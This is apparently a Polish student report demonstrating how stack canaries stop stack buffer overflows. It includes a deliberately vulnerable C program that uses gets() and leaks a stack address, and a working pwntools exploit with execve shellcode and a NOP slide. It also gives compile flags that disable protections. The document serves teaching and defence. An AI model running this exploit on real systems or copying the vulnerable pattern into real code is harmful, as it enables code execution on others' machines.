# Badanie rozwiązań chroniących natywne aplikacje działające w trybie użytkownika

## Wstęp
Celem pracy jest zbadanie wybranych rozwiązań chroniących natywne aplikacje działające w trybie użytkownika. W celu przeprowadzenia wszelkich praktycznych części każdego z zagadnień używany był przeze mnie system Ubuntu 20.04.2.0 w wersji 64-bitowej. Innymi użytymi narzędziami był Python 3.8.5, kompilator gcc w wersji 9.3.0, oraz debugger GNU gdb w wersji 9.2.

### Przepełnienie bufora
Wszystkie rozwiązania badane przeze mnie w poniższej pracy mają na celu ochronę użytkownika przed atakami typu _Buffer Overflow_. Z tego też względu na początku postanowiłem lepiej przybliżyć koncepcje tego typu ataków.  

W tej pracy skupiam się na przepełnieniu bufora na stosie. Jest ono możliwe, ze względu na zastosowanie niebezpiecznych funkcji w różnych językach programowania. Tymi językami są najczęściej _C_/_C++_, ponieważ nie posiadają one wbudowanych zabezpieczeń przed nadpisaniem, bądź dostępem do danych w pamięci. Rozważania prowadzone dalej prowadzone są dla użycia języka _C_. Wyzej wspomniane funkcje pozwalają użytkownikowi na wpisanie danych do pamięci, poza wyznaczony obszar. Jest to możliwe ponieważ nie dokonują one poprawnej weryfikacji wprowadzonych danych. W takiej sytuacji użytkownik może wprowadzić dane o większej długości, niż przeznaczony na to bufor. Nadmiarowa długość wejścia nadpisze pamięć poza buforem.  

Niebezpieczeństwo opisanej powyżej sytuacji wynika z tego, że bufor w pamięci znajduje się na stosie wywołania danej fukncji (rozpatruję przypadek bufora na stosie). Stos jest strukturą przechowującą nie tylko bufor, ale i inne dane związane z wywołaniem funkcji. To takich danych należą m.in. zmienne lokalne, oraz wskaźniki. Kluczowym w prowadzonych rozważaniach wskaźnikiem będzie _return pointer_ (wskaźnik na adres powrotu). Nadpisanie zawartości pamięci pod adresem takiego wskaźnika (który znajduje się pod buforem), w teorii może pozwolić atakującemu na wskazanie procesorowi dowolnego miejsca w pamięci, jako dalszej części programu i zmusić go do wykonania znajdujących się w tym obszarze instrukcji. Jednym ze sposobów na to, aby napastnik mógł wykonać napisane przez siebie samego instrukcje, jest np. umieszczenie ich w przepełnianym buforze i wskazanie ich lokalizacji jako adres powrotu funkcji. Celem atakującego może być również przykładowo nadpisanie zmiennych lokalnych funkcji na stosie (np. aby zaburzyć integralność danych dla danego wykonania programu).  

W praktyce, w nowoczesnych systemach komputerowych, nie jest to takie trywialne. Dzisiejsze kompilatory czy same systemy operacyjne dostarczają często wiele warstw rozwiązań, mających na celu zabezpieczyć aplikacje przed możliwością wykonania takiego ataku. W poniższej pracy omówię trzy, często stosowane, przykłady takich rozwiązań.  

Dla omówienia poszczególnych rozwiązań skupię się na ataku przez nadpisanie adresu powrotu ramki stosu.

## Kanarki stosu
### Zakres działania

Kanarek stosu jest specjalną wartością umieszczoną na stosie w odpowiednim miejscu, w taki sposób aby chronić dane stosu przed nadpisaniem od strony bufora. Można go skategoryzować jako zabezpieczenie służące do wykrycia próby przepełnienia buforu na stosie. Jest on dodawany automatycznie przez nowoczesne kompilatory, podczas procesu kompilacji kodu programu (pod warunkiem że taka opcja nie zostanie wyłączona). Dąży się do tego, aby miał on unikalną wartość, która będzie sprawdzana, gdy program powraca do funkcji wywołującej. W przypadku kiedy dojdzie do przepełnienia bufra na stosie i nadpisania kluczowych dla atakującego danych na stosie (np. wspomniany wcześniej adres powrotu), wtedy nieuniknionym powinno być nadpisanie przez atakującego wartości kanarka. Będzie to skutkowało blędną weryfikacją przed samym powrotem funkcji, co spowoduje przerwanie działania programu. Zapobiegnie to przejściu procesora do wykonywania instrukcji wskazanych przez atakującego.  


<p align="center">
  <img src="obrazy/kanarek_1.png" />
</p>
<p align = "center">
  Rys.1 - Schematyczne przedstawienie możliwej struktury ramki stosu z uwzględnieniem kanarka stosu.
</p>  
  

<p align="center">
  <img src="obrazy/kanarek_2.png" />
</p>
<p align = "center">
  Rys.2 - Część wygenerowanego przez kompilator gcc kodu Assemblera dla włączonych, i dla wyłączonych kanarków stosu.
</p>

#### Typy kanarków stosu

Można wyróżnić różne typy kanarków. Są nimi między innymi:
- _**Null canary**_ - Najprostszy typ kanarka. Dla systemu 32-bitowego składa się z czterech bajtów _NULL_ pod rząd. Jego wartość jest przewidywalna dla atakującego, więc tego typu kanarek ma na celu ochronę przed przepełnieniami bufora za pomocą funkcji operujących na stringach.
- _**Terminator canary**_ - Zbliżony w koncepcji działania do _Null canary_. Zawiera on bajty: _0x00, 0x0d, 0x0a, 0xff_. Powinny one przerwać ciąg znaków dla większości operacji operujących na stringach.
- _**Random canary**_ - Losowy kanarek stosu. Jego trzy pseudolosowe bajty mogą być poprzedzone _NULL_-bajtem (0x00).
- _**Random XOR canary**_ - _Random canary_, którego wartość może być dodatkowo _XOR_-owana np. z wartościami wskaźników. Dodaje to dodatkową warstwę bezpieczeństwa przy próbie podmienienia wartości kanarka i nadpisania jakiegoś wskaźnika przez napastnika.

### Przykładowa aplikacja
Poniższa aplikacja została napisana w języku _C_. Jest to prosta aplikacja pobierająca dane tekstowe od użytkownika (jego imię). Ze względu na to, że przedmiotem badań tego punktu są kanarki stosu - postanowiłem w celach demonstracyjnych umieścić w aplikacji kawałek kodu, który wprost podaje użytkownikowi adres stosu funkcji _main_.

```C
#include <stdio.h>
#include <stdlib.h>

void get_users_name()
{
    char name[64] = {0};
    puts("Podaj imie:");
    gets(name);
    printf("Czesc %s!\n", name);
}

int main()
{
    int x;
    printf("Adres na stosie main: %p\n", &x);
    get_users_name();
    return 0;
}
```

Aplikacja ta, w celu przyjęcia danych od użytkownika używa niebezpiecznej funkcji _gets()_, która została już usunięta ze standardu języka _C_. 
Plik _main.c_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Kanarki_.

### Exploit

Poniższy exploit pobiera od aplikacji adres z ramki stosu _main_, następnie na podstawie pobranego adresu, oraz _shellcode_'u tworzy ładunek. Ładunek został skonstruowany w taki sposób, aby wykonywalny _shellcode_ umieścić w ramce stosu _main_, tak aby wskazany adres powrotu doprowadził do wykonania _shellcode_'u (dzięki wykorzystaniu _NOP Slide_).

```Python
from pwn import *

#uruchamia proces main i zczytuje adres stosu:
p = process("./main")
p.readuntil("Adres na stosie main: ")
stack_ptr = int(p.readuntil("\n").strip(), 16)
p.readuntil("Podaj imie:\n")

#przygotowanie ciagu bajtow do przepelnienia bufora
padding = b'\x90'*72
RIP = p64(stack_ptr)
NOP = b'\x90'*128
shellcode =b'\xeb\x1e\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x48\x31\xc9\x0f\x05\x48\x31\xc0\x48\x31\xff\xb0\x3c\x0f\x05\xe8\xdd\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x70\xd8\xff\xff\xff\x7f'
payload =  padding + RIP + NOP + shellcode

#debugger
gdb.attach(p)

#wyslanie ladunku
p.sendline(payload)
print(p.readall())
```

Plik _exploit.py_ zawierający powyższy kod został dołączony do repozytorium i znajduje się w katalogu _Kanarki_.

#### Działanie exploitu dla wersji programu bez włączonego zabezpieczenia, oraz z włączonym zabezpieczeniem


Poniżej okno debuggera dla uruchomienia exploitu komendą ```python3 exploit.py``` z wyłączonymi kanarkami stosu (komenda użyta do kompilacji pliku main.c: ```gcc main.c -std=c99 -fno-stack-protector -z execstack -no-pie -w -o main -Wl,-z,norelro```):

<p align="center">
  <img src="obrazy/exploit_bez_kanarkow.png" />
</p>
<p align = "center">
  Rys.3 - Jak widać wykonanie shellcode'u powiodło się.
</p>  


Okno debuggera dla uruchomienia exploitu komendą ```python3 exploit.py``` z włączonymi kanarkami stosu (komenda użyta do kompilacji pliku main.c: ```gcc main.c -std=c99 -z execstack -no-pie -w -o main -Wl,-z,norelro```):

<p align="center">
  <img src="obrazy/exploit_z_kanarkami.png" />
</p>
<p align = "center">
  Rys.4 - W tej sytuacji wykonanie programu zostało zatrzymane zgodnie z oczekiwaniami.
</p>  

### Porównanie metody dla kompilatorów gcc oraz clang
Przedstawiana w tym punkcie metoda działa w podobny sposób w przypadku najnowszych wersji obu tych kompilatorów.

### Użyteczność metody oraz wady jej stosowania
Kanarki stosu są jedną z podstawowych metod zabezpieczenia przed atakami typu _buffer overflow_. Mimo wprowadzanych ulepszeń jak np. w kwestii randomizacji wartości kanarka, mogą się one okazać możliwe do przewidzenia, więc nigdy nie stanowią pełnego zabezpieczenia. Wymuszają one dla procesora dodatkowe instrukcje, wydłużając czas wykonania programu.
